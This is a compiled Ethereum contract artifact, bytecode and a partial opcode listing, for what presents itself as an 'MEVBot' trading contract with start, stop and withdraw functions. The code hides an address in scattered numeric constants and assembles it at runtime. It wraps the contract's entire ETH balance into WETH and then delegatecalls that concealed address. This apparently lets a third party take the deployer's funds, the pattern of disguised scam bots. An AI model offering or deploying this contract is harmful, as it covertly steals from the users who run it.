{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040526000600260146101000a81548160ff0219169083151502179055503480156200002c57600080fd5b506001461462000073576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200006a9062000e15565b60405180910390fd5b33600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073dac17f958d2ee523a2206206994597c13d831ec7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506200016f60006200017560201b60201c565b62001332565b6000620001976200018b620002e960201b60201c565b620004c960201b60201c565b90506000620001ab620007c760201b60201c565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1685604051602401620002049392919062000efc565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000808373ffffffffffffffffffffffffffffffffffffffff16836040516200028d919062000fb2565b600060405180830381855af49150503d8060008114620002ca576040519150601f19603f3d011682016040523d82523d6000602084013e620002cf565b606091505b509150915081620002e257805160208201fd5b5050505050565b60606000620002fd620007d660201b60201c565b90506000620f381d9050600062000319620007e160201b60201c565b90506000620125499050600062000335620007ec60201b60201c565b905060006158769050600062000350620007f760201b60201c565b90506000620b655a905060006200038e620003718a6200080260201b60201c565b620003828a6200080260201b60201c565b62000adf60201b60201c565b90506000620003c4620003a7896200080260201b60201c565b620003b8896200080260201b60201c565b62000adf60201b60201c565b90506000620003fa620003dd886200080260201b60201c565b620003ee886200080260201b60201c565b62000adf60201b60201c565b905060006200043062000413876200080260201b60201c565b62000424876200080260201b60201c565b62000adf60201b60201c565b90506000620004686200044a868662000adf60201b60201c565b6200045c858562000adf60201b60201c565b62000adf60201b60201c565b90506000620004b36040518060400160405280600281526020017f30780000000000000000000000000000000000000000000000000000000000008152508362000adf60201b60201c565b9050809e50505050505050505050505050505090565b600080829050600080806000600290505b602a811015620007ba5761010084620004f4919062000ffa565b93508481815181106200050c576200050b62001045565b5b602001015160f81c60f81b60f81c60ff169250846001826200052f91906200107e565b8151811062000543576200054262001045565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801562000595575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15620005b257605783620005aa9190620010b9565b925062000667565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015620005f1575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156200060e57603783620006069190620010b9565b925062000666565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156200064d575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156200066557603083620006629190620010b9565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015620006a6575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15620006c357605782620006bb9190620010b9565b915062000778565b60418273ffffffffffffffffffffffffffffffffffffffff161015801562000702575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156200071f57603782620007179190620010b9565b915062000777565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156200075e575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156200077657603082620007739190620010b9565b91505b5b5b8160108462000788919062000ffa565b62000794919062001108565b84620007a1919062001108565b9350600281620007b291906200107e565b9050620004da565b5082945050505050919050565b600063fd7e4d8060e01b905090565b60006204ead2905090565b60006202dcc7905090565b6000620ca7bb905090565b6000620c2916905090565b60606000808390505b600081146200083b578180620008219062001157565b925050601081620008339190620011d3565b90506200080b565b60008267ffffffffffffffff8111156200085a57620008596200120b565b5b6040519080825280601f01601f1916602001820160405280156200088d5781602001600182028036833780820191505090505b50905060005b838110156200094357601086620008ab91906200123a565b9250620008be8362000c9860201b60201c565b8260018387620008cf919062001272565b620008db919062001272565b81518110620008ef57620008ee62001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010866200092d9190620011d3565b9550806200093b9062001157565b905062000893565b5060008151905060048103620009ac5760006200099c6040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6003810362000a0e576000620009fe6040518060400160405280600281526020017f30300000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6002810362000a7057600062000a606040518060400160405280600381526020017f30303000000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b6001810362000ad257600062000ac26040518060400160405280600481526020017f30303030000000000000000000000000000000000000000000000000000000008152508462000adf60201b60201c565b9050809550505050505062000ada565b819450505050505b919050565b60606000839050600083905060008151835162000afd91906200107e565b67ffffffffffffffff81111562000b195762000b186200120b565b5b6040519080825280601f01601f19166020018201604052801562000b4c5781602001600182028036833780820191505090505b5090506000819050600080600091505b855182101562000bf05785828151811062000b7c5762000b7b62001045565b5b602001015160f81c60f81b83828062000b959062001157565b93508151811062000bab5762000baa62001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350818062000be79062001157565b92505062000b5c565b600091505b845182101562000c895784828151811062000c155762000c1462001045565b5b602001015160f81c60f81b83828062000c2e9062001157565b93508151811062000c445762000c4362001045565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350818062000c809062001157565b92505062000bf5565b82965050505050505092915050565b60008160ff1660001115801562000cb3575060098260ff1611155b1562000cf557817f300000000000000000000000000000000000000000000000000000000000000060f81c62000cea9190620012ba565b60f81b905062000d63565b8160ff16600a1115801562000d0e5750600f8260ff1611155b1562000d5e57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c62000d479190620012ba565b62000d539190620012f6565b60f81b905062000d63565b600080fd5b919050565b600082825260208201905092915050565b7f4f6e6c79206d61696e6e657420697320737570706f727465642e204f6e6c792060008201527f6d61696e6e657420697320737570706f727465642e204f6e6c79206d61696e6e60208201527f657420697320737570706f727465642e00000000000000000000000000000000604082015250565b600062000dfd60508362000d68565b915062000e0a8262000d79565b606082019050919050565b6000602082019050818103600083015262000e308162000dee565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600062000e648262000e37565b9050919050565b62000e768162000e57565b82525050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b6004811062000ebf5762000ebe62000e7c565b5b50565b600081905062000ed28262000eab565b919050565b600062000ee48262000ec2565b9050919050565b62000ef68162000ed7565b82525050565b600060608201905062000f13600083018662000e6b565b62000f22602083018562000e6b565b62000f31604083018462000eeb565b949350505050565b600081519050919050565b600081905092915050565b60005b8381101562000f6f57808201518184015260208101905062000f52565b60008484015250505050565b600062000f888262000f39565b62000f94818562000f44565b935062000fa681856020860162000f4f565b80840191505092915050565b600062000fc0828462000f7b565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000620010078262000e37565b9150620010148362000e37565b9250828202620010248162000e37565b915082820484148315176200103e576200103d62000fcb565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000819050919050565b60006200108b8262001074565b9150620010988362001074565b9250828201905080821115620010b357620010b262000fcb565b5b92915050565b6000620010c68262000e37565b9150620010d38362000e37565b9250828203905073ffffffffffffffffffffffffffffffffffffffff81111562001102576200110162000fcb565b5b92915050565b6000620011158262000e37565b9150620011228362000e37565b9250828201905073ffffffffffffffffffffffffffffffffffffffff81111562001151576200115062000fcb565b5b92915050565b6000620011648262001074565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820362001199576200119862000fcb565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000620011e08262001074565b9150620011ed8362001074565b9250826200120057620011ff620011a4565b5b828204905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000620012478262001074565b9150620012548362001074565b925082620012675762001266620011a4565b5b828206905092915050565b60006200127f8262001074565b91506200128c8362001074565b9250828203905081811115620012a757620012a662000fcb565b5b92915050565b600060ff82169050919050565b6000620012c782620012ad565b9150620012d483620012ad565b9250828201905060ff811115620012f057620012ef62000fcb565b5b92915050565b60006200130382620012ad565b91506200131083620012ad565b9250828203905060ff8111156200132c576200132b62000fcb565b5b92915050565b6117eb80620013426000396000f3fe6080604052600436106100745760003560e01c8063be9a65551161004e578063be9a65551461017e578063c55dae6314610188578063d85bd526146101b3578063e086e5ec146101de57610119565b806307da68f51461011e578063217a4b70146101285780638da5cb5b1461015357610119565b3661011957600260149054906101000a900460ff16156101175760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100fc57600080fd5b505af1158015610110573d6000803e3d6000fd5b5050505050505b005b600080fd5b6101266101e8565b005b34801561013457600080fd5b5061013d610229565b60405161014a91906110b6565b60405180910390f35b34801561015f57600080fd5b5061016861024f565b60405161017591906110b6565b60405180910390f35b610186610275565b005b34801561019457600080fd5b5061019d6103f7565b6040516101aa91906110b6565b60405180910390f35b3480156101bf57600080fd5b506101c861041b565b6040516101d591906110ec565b60405180910390f35b6101e661042e565b005b6101f260026105e4565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161021f90611164565b60405180910390a1565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b61027f60016105e4565b6001600260146101000a81548160ff021916908315150217905550600047905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b15801561030757600080fd5b505af115801561031b573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b815260040161037b92919061119d565b6020604051808303816000875af115801561039a573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103be91906111f7565b507fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab6040516103ec90611270565b60405180910390a150565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260149054906101000a900460ff1681565b600260149054906101000a900460ff1661047d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610474906112dc565b60405180910390fd5b61048760036105e4565b600047905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b1580156104f457600080fd5b505af1158015610508573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b815260040161056892919061119d565b6020604051808303816000875af1158015610587573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ab91906111f7565b507fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab6040516105d990611348565b60405180910390a150565b60006105f66105f1610739565b610879565b90506000610602610b47565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1685604051602401610659939291906113df565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090506000808373ffffffffffffffffffffffffffffffffffffffff16836040516106e09190611487565b600060405180830381855af49150503d806000811461071b576040519150601f19603f3d011682016040523d82523d6000602084013e610720565b606091505b50915091508161073257805160208201fd5b5050505050565b60606000610745610b56565b90506000620f381d90506000610759610b61565b90506000620125499050600061076d610b6c565b9050600061587690506000610780610b77565b90506000620b655a905060006107a66107988a610b82565b6107a18a610b82565b610e16565b905060006107c46107b689610b82565b6107bf89610b82565b610e16565b905060006107e26107d488610b82565b6107dd88610b82565b610e16565b905060006108006107f287610b82565b6107fb87610b82565b610e16565b905060006108206108118686610e16565b61081b8585610e16565b610e16565b905060006108636040518060400160405280600281526020017f307800000000000000000000000000000000000000000000000000000000000081525083610e16565b9050809e50505050505050505050505050505090565b600080829050600080806000600290505b602a811015610b3a57610100846108a191906114cd565b93508481815181106108b6576108b561150f565b5b602001015160f81c60f81b60f81c60ff169250846001826108d7919061153e565b815181106108e8576108e761150f565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610939575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156109525760578361094b9190611572565b92506109fe565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610990575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156109a9576037836109a29190611572565b92506109fd565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156109e7575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156109fc576030836109f99190611572565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610a3c575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610a5557605782610a4e9190611572565b9150610b01565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610a93575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610aac57603782610aa59190611572565b9150610b00565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610aea575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610aff57603082610afc9190611572565b91505b5b5b81601084610b0f91906114cd565b610b1991906115ba565b84610b2491906115ba565b9350600281610b33919061153e565b905061088a565b5082945050505050919050565b600063fd7e4d8060e01b905090565b60006204ead2905090565b60006202dcc7905090565b6000620ca7bb905090565b6000620c2916905090565b60606000808390505b60008114610bb5578180610b9e90611602565b925050601081610bae9190611679565b9050610b8b565b60008267ffffffffffffffff811115610bd157610bd06116aa565b5b6040519080825280601f01601f191660200182016040528015610c035781602001600182028036833780820191505090505b50905060005b83811015610ca257601086610c1e91906116d9565b9250610c2983610fb1565b8260018387610c38919061170a565b610c42919061170a565b81518110610c5357610c5261150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086610c8f9190611679565b955080610c9b90611602565b9050610c09565b5060008151905060048103610d01576000610cf26040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60038103610d59576000610d4a6040518060400160405280600281526020017f303000000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60028103610db1576000610da26040518060400160405280600381526020017f303030000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60018103610e09576000610dfa6040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b819450505050505b919050565b606060008390506000839050600081518351610e32919061153e565b67ffffffffffffffff811115610e4b57610e4a6116aa565b5b6040519080825280601f01601f191660200182016040528015610e7d5781602001600182028036833780820191505090505b5090506000819050600080600091505b8551821015610f1557858281518110610ea957610ea861150f565b5b602001015160f81c60f81b838280610ec090611602565b935081518110610ed357610ed261150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180610f0d90611602565b925050610e8d565b600091505b8451821015610fa257848281518110610f3657610f3561150f565b5b602001015160f81c60f81b838280610f4d90611602565b935081518110610f6057610f5f61150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180610f9a90611602565b925050610f1a565b82965050505050505092915050565b60008160ff16600011158015610fcb575060098260ff1611155b1561100957817f300000000000000000000000000000000000000000000000000000000000000060f81c610fff919061174b565b60f81b9050611070565b8160ff16600a111580156110215750600f8260ff1611155b1561106b57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c611057919061174b565b6110619190611780565b60f81b9050611070565b600080fd5b919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006110a082611075565b9050919050565b6110b081611095565b82525050565b60006020820190506110cb60008301846110a7565b92915050565b60008115159050919050565b6110e6816110d1565b82525050565b600060208201905061110160008301846110dd565b92915050565b600082825260208201905092915050565b7f4d4556426f742073746f702e0000000000000000000000000000000000000000600082015250565b600061114e600c83611107565b915061115982611118565b602082019050919050565b6000602082019050818103600083015261117d81611141565b9050919050565b6000819050919050565b61119781611184565b82525050565b60006040820190506111b260008301856110a7565b6111bf602083018461118e565b9392505050565b600080fd5b6111d4816110d1565b81146111df57600080fd5b50565b6000815190506111f1816111cb565b92915050565b60006020828403121561120d5761120c6111c6565b5b600061121b848285016111e2565b91505092915050565b7f4d4556426f742073746172742e00000000000000000000000000000000000000600082015250565b600061125a600d83611107565b915061126582611224565b602082019050919050565b600060208201905081810360008301526112898161124d565b9050919050565b7f4d4556426f74206e6f742072756e6e696e672e00000000000000000000000000600082015250565b60006112c6601383611107565b91506112d182611290565b602082019050919050565b600060208201905081810360008301526112f5816112b9565b9050919050565b7f4d4556426f7420776974686472617720416c6c00000000000000000000000000600082015250565b6000611332601383611107565b915061133d826112fc565b602082019050919050565b6000602082019050818103600083015261136181611325565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b600481106113a8576113a7611368565b5b50565b60008190506113b982611397565b919050565b60006113c9826113ab565b9050919050565b6113d9816113be565b82525050565b60006060820190506113f460008301866110a7565b61140160208301856110a7565b61140e60408301846113d0565b949350505050565b600081519050919050565b600081905092915050565b60005b8381101561144a57808201518184015260208101905061142f565b60008484015250505050565b600061146182611416565b61146b8185611421565b935061147b81856020860161142c565b80840191505092915050565b60006114938284611456565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006114d882611075565b91506114e383611075565b92508282026114f181611075565b915082820484148315176115085761150761149e565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600061154982611184565b915061155483611184565b925082820190508082111561156c5761156b61149e565b5b92915050565b600061157d82611075565b915061158883611075565b9250828203905073ffffffffffffffffffffffffffffffffffffffff8111156115b4576115b361149e565b5b92915050565b60006115c582611075565b91506115d083611075565b9250828201905073ffffffffffffffffffffffffffffffffffffffff8111156115fc576115fb61149e565b5b92915050565b600061160d82611184565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361163f5761163e61149e565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061168482611184565b915061168f83611184565b92508261169f5761169e61164a565b5b828204905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b60006116e482611184565b91506116ef83611184565b9250826116ff576116fe61164a565b5b828206905092915050565b600061171582611184565b915061172083611184565b92508282039050818111156117385761173761149e565b5b92915050565b600060ff82169050919050565b60006117568261173e565b91506117618361173e565b9250828201905060ff81111561177a5761177961149e565b5b92915050565b600061178b8261173e565b91506117968361173e565b9250828203905060ff8111156117af576117ae61149e565b5b9291505056fea26469706673582212205bc9528689f49d6ce06fa33ed05c756893dd4e114d1fcb69d3639a21529ae45364736f6c63430008120033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x2 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH3 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 CHAINID EQ PUSH3 0x73 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x6A SWAP1 PUSH3 0xE15 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xDAC17F958D2EE523A2206206994597C13D831EC7 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH3 0x16F PUSH1 0x0 PUSH3 0x175 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1332 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x197 PUSH3 0x18B PUSH3 0x2E9 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x4C9 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1AB PUSH3 0x7C7 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH3 0x204 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0xEFC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x40 MLOAD PUSH3 0x28D SWAP2 SWAP1 PUSH3 0xFB2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH3 0x2CA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH3 0x2CF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH3 0x2E2 JUMPI DUP1 MLOAD PUSH1 0x20 DUP3 ADD REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH3 0x2FD PUSH3 0x7D6 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xF381D SWAP1 POP PUSH1 0x0 PUSH3 0x319 PUSH3 0x7E1 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x12549 SWAP1 POP PUSH1 0x0 PUSH3 0x335 PUSH3 0x7EC PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x5876 SWAP1 POP PUSH1 0x0 PUSH3 0x350 PUSH3 0x7F7 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xB655A SWAP1 POP PUSH1 0x0 PUSH3 0x38E PUSH3 0x371 DUP11 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x382 DUP11 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3C4 PUSH3 0x3A7 DUP10 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x3B8 DUP10 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3FA PUSH3 0x3DD DUP9 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x3EE DUP9 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x430 PUSH3 0x413 DUP8 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x424 DUP8 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x468 PUSH3 0x44A DUP7 DUP7 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x45C DUP6 DUP6 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x4B3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH3 0x7BA JUMPI PUSH2 0x100 DUP5 PUSH3 0x4F4 SWAP2 SWAP1 PUSH3 0xFFA JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH3 0x50C JUMPI PUSH3 0x50B PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH3 0x52F SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH3 0x543 JUMPI PUSH3 0x542 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x595 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x5B2 JUMPI PUSH1 0x57 DUP4 PUSH3 0x5AA SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP PUSH3 0x667 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x5F1 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x60E JUMPI 